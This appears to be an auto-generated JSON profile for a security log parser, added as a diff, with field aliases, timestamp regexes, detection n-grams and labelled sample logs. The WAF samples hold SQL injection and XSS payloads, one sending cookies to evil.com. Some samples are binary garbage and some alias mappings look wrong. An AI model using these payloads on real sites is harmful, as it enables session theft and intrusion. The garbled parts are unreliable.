@@ -1,0 +1,380 @@
+{
+  "generated_at": "2026-05-26T09:18:42.309710+00:00",
+  "corpus_size": 3,
+  "format_record_counts": {
+    "json": 23000,
+    "syslog": 27651,
+    "waf": 15000,
+    "csv": 41,
+    "generic": 2963
+  },
+  "field_aliases": {
+    "syslog": {
+      "host": "source_ip",
+      "hostname": "source_ip",
+      "user": "user",
+      "username": "user",
+      "pid": "port"
+    },
+    "apache": {
+      "client": "source_ip",
+      "bytes_sent": "bytes",
+      "size": "bytes",
+      "status_code": "status",
+      "code": "status"
+    },
+    "logfmt": {
+      "src": "source_ip",
+      "src_ip": "source_ip",
+      "srcip": "source_ip",
+      "dst": "dest_ip",
+      "dst_ip": "dest_ip",
+      "dstip": "dest_ip",
+      "dport": "port",
+      "sport": "port",
+      "src_port": "port",
+      "bytes_out": "bytes",
+      "bytes_sent": "bytes",
+      "size": "bytes",
+      "msg": "event_type",
+      "message": "event_type",
+      "action": "event_type",
+      "ts": "timestamp",
+      "time": "timestamp",
+      "lvl": "status",
+      "level": "status",
+      "user": "user",
+      "username": "user",
+      "usr": "user"
+    },
+    "json": {
+      "src_ip": "source_ip",
+      "srcip": "source_ip",
+      "client_ip": "source_ip",
+      "remoteAddr": "source_ip",
+      "remote_addr": "source_ip",
+      "dst_ip": "dest_ip",
+      "dstip": "dest_ip",
+      "dest": "dest_ip",
+      "eventType": "event_type",
+      "EventID": "event_type",
+      "msg": "event_type",
+      "message": "event_type",
+      "action": "event_type",
+      "bytes_out": "bytes",
+      "bytes_sent": "bytes",
+      "size": "bytes",
+      "dport": "port",
+      "dst_port": "port",
+      "ts": "timestamp",
+      "time": "timestamp",
+      "datetime": "timestamp",
+      "username": "user",
+      "User": "user",
+      "usr": "user",
+      "statusCode": "status",
+      "status_code": "status",
+      "code": "status",
+      "attack_type": "event_type",
+      "timestamp": "timestamp",
+      "hostname": "source_ip",
+      "src_port": "source_ip",
+      "eventtime": "event_type",
+      "eventsource": "source_ip",
+      "eventname": "event_type",
+      "useridentity": "user",
+      "sourceipaddress": "source_ip",
+      "useragent": "user",
+      "responseelements": "timestamp",
+      "eventtype": "event_type",
+      "user": "user",
+      "resource": "source_ip",
+      "destination": "dest_ip"
+    },
+    "csv": {
+      "src_ip": "source_ip",
+      "srcip": "source_ip",
+      "dst_ip": "dest_ip",
+      "dstip": "dest_ip",
+      "EventID": "event_type",
+      "event_id": "event_type",
+      "bytes_out": "bytes",
+      "size": "bytes",
+      "dport": "port",
+      "dst_port": "port",
+      "ts": "timestamp",
+      "username": "user",
+      "User": "user",
+      "statusCode": "status",
+      "status_code": "status"
+    },
+    "winevent": {
+      "Computer": "source_ip",
+      "SubjectUserName": "user",
+      "TargetUserName": "user",
+      "IpAddress": "source_ip",
+      "LogonType": "status",
+      "EventID": "event_type"
+    },
+    "generic": {}
+  },
+  "timestamp_patterns": {
+    "syslog": [
+      "\\b\\w{3}\\s+\\d{1,2}\\s+\\d{2}:\\d{2}:\\d{2}\\b",
+      "\\b\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}"
+    ],
+    "apache": [
+      "\\[\\d{2}/\\w+/\\d{4}:\\d{2}:\\d{2}:\\d{2}\\s[+-]\\d{4}\\]"
+    ],
+    "logfmt": [
+      "time=\\S+",
+      "ts=\\S+"
+    ],
+    "json": [
+      "\"timestamp\"\\s*:\\s*\"\\d{4}-\\d{2}-\\d{2}",
+      "\"time\"\\s*:\\s*\"\\d{4}-\\d{2}-\\d{2}"
+    ],
+    "winevent": [
+      "\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}"
+    ],
+    "csv": [
+      "\\d{4}-\\d{2}-\\d{2}[\\sT]\\d{2}:\\d{2}:\\d{2}"
+    ],
+    "generic": [
+      "\\d{4}-\\d{2}-\\d{2}",
+      "\\d{2}/\\w+/\\d{4}"
+    ]
+  },
+  "format_detection_signals": {
+    "json": [
+      {
+        "pattern": "useridentity type",
+        "specificity": 1.0,
+        "count": 5000
+      },
+      {
+        "pattern": "type iamuser",
+        "specificity": 1.0,
+        "count": 5000
+      },
+      {
+        "pattern": "iamuser username",
+        "specificity": 1.0,
+        "count": 5000
+      },
+      {
+        "pattern": "sourceipaddress useragent",
+        "specificity": 1.0,
+        "count": 5000
+      },
+      {
+        "pattern": "responseelements null",
+        "specificity": 1.0,
+        "count": 5000
+      },
+      {
+        "pattern": "null eventtype",
+        "specificity": 1.0,
+        "count": 5000
+      },
+      {
+        "pattern": "eventtype awsapicall",
+        "specificity": 1.0,
+        "count": 5000
+      },
+      {
+        "pattern": "awsapicall label",
+        "specificity": 1.0,
+        "count": 5000
+      },
+      {
+        "pattern": "useragent aws-cli",
+        "specificity": 1.0,
+        "count": 3992
+      },
+      {
+        "pattern": "aws-cli requestparameters",
+        "specificity": 1.0,
+        "count": 3992
+      }
+    ],
+    "syslog": [
+      {
+        "pattern": "password for",
+        "specificity": 1.0,
+        "count": 4199
+      },
+      {
+        "pattern": "from port",
+        "specificity": 1.0,
+        "count": 4199
+      },
+      {
+        "pattern": "port ssh2",
+        "specificity": 1.0,
+        "count": 4199
+      },
+      {
+        "pattern": "sshd failed",
+        "specificity": 1.0,
+        "count": 3389
+      },
+      {
+        "pattern": "failed password",
+        "specificity": 1.0,
+        "count": 3389
+      },
+      {
+        "pattern": "sshd accepted",
+        "specificity": 1.0,
+        "count": 810
+      },
+      {
+        "pattern": "accepted password",
+        "specificity": 1.0,
+        "count": 810
+      },
+      {
+        "pattern": "sshd pam_unix",
+        "specificity": 1.0,
+        "count": 801
+      },
+      {
+        "pattern": "pam_unix sshd",
+        "specificity": 1.0,
+        "count": 801
+      },
+      {
+        "pattern": "sshd session",
+        "specificity": 1.0,
+        "count": 801
+      }
+    ],
+    "waf": [
+      {
+        "pattern": "apr get",
+        "specificity": 1.0,
+        "count": 4040
+      },
+      {
+        "pattern": "http mozilla",
+        "specificity": 1.0,
+        "count": 3581
+      },
+      {
+        "pattern": "http curl",
+        "specificity": 1.0,
+        "count": 1221
+      },
+      {
+        "pattern": "mozilla macintosh",
+        "specificity": 1.0,
+        "count": 1190
+      },
+      {
+        "pattern": "macintosh intel",
+        "specificity": 1.0,
+        "count": 1190
+      },
+      {
+        "pattern": "intel mac",
+        "specificity": 1.0,
+        "count": 1190
+      },
+      {
+        "pattern": "mac safari",
+        "specificity": 1.0,
+        "count": 1190
+      },
+      {
+        "pattern": "mozilla windows",
+        "specificity": 1.0,
+        "count": 1182
+      },
+      {
+        "pattern": "windows win64",
+        "specificity": 1.0,
+        "count": 1182
+      },
+      {
+        "pattern": "win64 x64",
+        "specificity": 1.0,
+        "count": 1182
+      }
+    ],
+    "generic": [
+      {
+        "pattern": "privilege escalation",
+        "specificity": 1.0,
+        "count": 64
+      },
+      {
+        "pattern": "lateral movement",
+        "specificity": 1.0,
+        "count": 48
+      },
+      {
+        "pattern": "credential access",
+        "specificity": 1.0,
+        "count": 38
+      },
+      {
+        "pattern": "defense evasion",
+        "specificity": 1.0,
+        "count": 36
+      },
+      {
+        "pattern": "deepblue.ps1 evtx",
+        "specificity": 1.0,
+        "count": 24
+      },
+      {
+        "pattern": "the work",
+        "specificity": 1.0,
+        "count": 24
+      },
+      {
+        "pattern": "this license",
+        "specificity": 1.0,
+        "count": 22
+      }
+    ]
+  },
+  "format_samples": {
+    "json": [
+      "{\"eventTime\": \"2026-04-01T00:12:03.000Z\", \"eventSource\": \"ec2.amazonaws.com\", \"eventName\": \"DescribeInstances\", \"userIdentity\": {\"type\": \"IAMUser\", \"userName\": \"ci-runner\", \"principalId\": \"AIDA5WQJZ6GF0ZGQBOI8\"}, \"sourceIPAddress\": \"10.4.1.119\", \"userAgent\": \"aws-cli/2.15.0\", \"requestParameters\": {}, \"responseElements\": null, \"eventType\": \"AwsApiCall\", \"label\": \"benign\", \"attack_type\": null, \"mitre_technique\": null}",
+      "{\"eventTime\": \"2026-04-17T13:58:51.000Z\", \"eventSource\": \"s3.amazonaws.com\", \"eventName\": \"PutObject\", \"userIdentity\": {\"type\": \"IAMUser\", \"userName\": \"svc-probably\", \"principalId\": \"AIDAJV3LVEKKXEE0T4T9\"}, \"sourceIPAddress\": \"10.7.56.43\", \"userAgent\": \"aws-cli/2.15.0\", \"requestParameters\": {\"policyArn\": \"arn:aws:s3:::company-uploads\"}, \"responseElements\": null, \"eventType\": \"AwsApiCall\", \"label\": \"benign\", \"attack_type\": null, \"mitre_technique\": null}",
+      "{\"timestamp\": \"2026-04-08T04:10:25.000Z\", \"user\": \"jordantami\", \"hostname\": \"srv-visit-89\", \"action\": \"email_external\", \"resource\": \"contracts_signed.zip\", \"file_count\": 1, \"severity\": \"high\", \"destination\": \"gmail.com\", \"label\": \"malicious\", \"attack_type\": \"data_exfiltration\", \"mitre_technique\": \"T1048\"}",
+      "{\"timestamp\": \"2026-04-03T08:36:06.000Z\", \"src_ip\": \"10.2.116.220\", \"dst_ip\": \"59.146.175.184\", \"src_port\": 63536, \"dst_port\": 443, \"protocol\": \"TCP\", \"action\": \"ALLOW\", \"bytes_sent\": 2521, \"hostname\": \"srv-military-98\", \"label\": \"benign\", \"attack_type\": null}",
+      "{\"timestamp\": \"2026-04-16T17:59:14.000Z\", \"src_ip\": \"206.91.230.238\", \"dst_ip\": \"10.9.79.229\", \"src_port\": 58879, \"dst_port\": 80, \"protocol\": \"TCP\", \"action\": \"DENY\", \"bytes_sent\": 2518, \"hostname\": \"srv-season-10\", \"label\": \"malicious\", \"attack_type\": \"inbound_probe\"}"
+    ],
+    "syslog": [
+      "Apr 01 00:11:02 srv-write-01 sshd[35119]: Accepted password for nwelch from 10.7.161.34 port 62200 ssh2",
+      "Apr 14 12:32:54 srv-visit-89 sshd[36934]: Failed password for sara86 from 80.211.5.133 port 60288 ssh2",
+      "Apr 21 20:14:19 srv-seat-90 sshd[16804]: Failed password for adamsapril from 50.204.108.167 port 53289 ssh2",
+      "CEF:0|Microsoft|Windows Security|1.0|4624|Successful Logon|2|start=2026-04-03T07:19:16.000Z src=10.4.39.106 dhost=srv-teach-23 duser=marshjordan cs1Label=Process cs1='C:\\\\Program Files\\\\Microsoft Office\\\\WINWORD.EXE' msg=Successful Logon",
+      "CEF:0|Microsoft|Windows Security|1.0|4624|Successful Logon|2|start=2026-04-16T13:28:13.000Z src=10.8.40.108 dhost=srv-write-01 duser=ashleybryant cs1Label=Process cs1='C:\\\\Windows\\\\System32\\\\svchost.exe -k netsvcs' msg=Successful Logon"
+    ],
+    "waf": [
+      "167.134.239.99 - - [01/Apr/2026:00:12:44 +0000] \"GET /api/v1/products?id=1'+UNION+SELECT+null,table_name+FROM+information_schema.tables-- HTTP/1.1\" 200 14662 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36\"",
+      "86.133.53.121 - - [06/Apr/2026:23:00:37 +0000] \"POST /comment?text=<svg onload=alert(1)> HTTP/1.1\" 403 1041 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0\"",
+      "125.98.85.3 - - [12/Apr/2026:18:27:53 +0000] \"GET /comment?text=<script>alert(1)</script> HTTP/1.1\" 400 3095 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0\"",
+      "173.237.200.64 - - [18/Apr/2026:13:55:29 +0000] \"GET /comment?text=\"><script>fetch('//evil.com?c='+document.cookie)</script> HTTP/1.1\" 200 352 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0\"",
+      "2.158.98.161 - - [24/Apr/2026:05:15:52 +0000] \"GET /static/main.js HTTP/1.1\" 404 371 \"-\" \"curl/7.88.1\""
+    ],
+    "csv": [
+      "duration,continuous",
+      "urgent,continuous",
+      "num_file_creations,continuous",
+      "serror_rate,continuous",
+      "dst_host_srv_count,continuous"
+    ],
+    "generic": [
+      "#!/usr/bin/perl",
+      "\u0013\u0013\ufffd\ufffdpd\ufffdxzG\ufffdQ\ufffd[\ufffd\u0006\u0003\ufffdBI\u0004\ufffd\ufffd\ufffd1\ufffd\"\ufffd\ufffd\ufffdI\ufffd#\ufffd\ufffd\ufffd\ufffd\u055c\ufffd>'\ufffd!\ufffd\u05f1\ufffd\u0011\ufffd\u000b\ufffd\f.\u0017\ufffd}\ufffd\ufffd9\ufffdD\ufffd\ufffd\u0017\u0004\ufffd2\ufffdy,\ufffd\u001c\u0755\ufffd\ufffd\ufffd\u0003k\u0756u\ufffd\ufffd\ufffd4\ufffdAZ\ufffd\u0015KG%\u0014\u007f\ufffd\ufffd5\ufffd\ufffdz\ufffd\ufffd\ufffd\ufffd{\ufffd\ufffd\ufffdIG\\\ufffd\ufffdlH\ufffd\ufffd\ufffd\ufffd\u0012\ufffd\u0778\ufffdh\ufffd\ufffdg\u0012\ufffd",
+      "can do so.  This is fundamentally incompatible with the aim of",
+      "\uf4f5\\\ufffd\u07ff/\ufffd\ufffd39#\ufffdj~9{\ufffd\ufffd\ufffd5\u007f\u0014z\u019e\u05d0\u0533)\ufffd3\ufffd\u9d1ce}OC\ufffdv\f.\ufffd\u068ex5/\ufffd\ufffdu\ufffd\ufffd\ufffdo\ufffd\ufffd\u06ce\ufffd\ufffd\ufffdm\ufffd\u01537[V\u8d03+\ufffd\ufffd7\ufffd\ufffd\ufffd\ufffd.Z?\u000fF\ufffd\ufffdX\ufffd\u04f6\u0018h\ufffd\f\ufffd\ufffdu\ufffd~\u03b5\ufffdA\ufffd\ufffd\ufffd\ufffd_,\ufffd\ufffd\ufffd\ufffdT\ufffd\ufffdU\u001d\ufffd\ufffd\ufffd\ufffd\ufffd/\ufffd\ufffd\ufffde\ufffdM\ufffd\ufffd\u001d\ufffdSG\ufffd\u01b1\ufffd\ufffd\ufffd\u0015\u0327\ufffdQ\u0015\ufffd21#\ufffd\ufffd*\ufffdk_\ufffd\u06f6\ufffd\ufffd\ufffd\ufffd\ufffdT\ufffd\ufffdu\ufffd2\ufffd\u001b\ufffdN.\ufffd\ufffd%\ufffd\ufffdr\ufffd\ufffd",
+      "\u001bV\ufffd\u001d]\ufffd>O\ufffd\ufffd\u03c8_\ufffd"
+    ]
+  }
+}
